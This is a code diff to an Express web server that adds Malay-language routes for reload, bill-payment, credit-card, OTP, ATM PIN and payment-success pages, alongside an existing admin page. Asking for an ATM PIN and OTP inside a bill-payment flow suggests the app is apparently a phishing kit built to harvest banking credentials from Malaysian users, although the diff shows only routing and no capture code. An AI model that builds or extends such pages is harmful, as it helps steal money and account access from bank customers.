@@ -412,6 +412,19 @@ app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.htm
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));
 app.get('/payment-success', (req, res) => res.sendFile(path.join(__dirname, 'payment-success.html')));
+
+// ── Malay (BM) routes ──
+app.get('/reload/ms', (req, res) => res.sendFile(path.join(__dirname, 'reload-ms.html')));
+app.get('/bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
+app.get('/bill-payment/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
+app.get('/pay-bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill-ms.html')));
+app.get('/payment-method/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));
+app.get('/credit-card/ms', (req, res) => res.sendFile(path.join(__dirname, 'credit-card-ms.html')));
+app.get('/processing/ms', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));
+app.get('/otp/ms', (req, res) => res.sendFile(path.join(__dirname, 'otp-ms.html')));
+app.get('/atm-pin/ms', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin-ms.html')));
+app.get('/payment-success/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-success-ms.html')));
+
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('*', (req, res) => {
   if (req.path.match(/\.[a-zA-Z0-9]+$/)) return res.status(404).send('Not found');
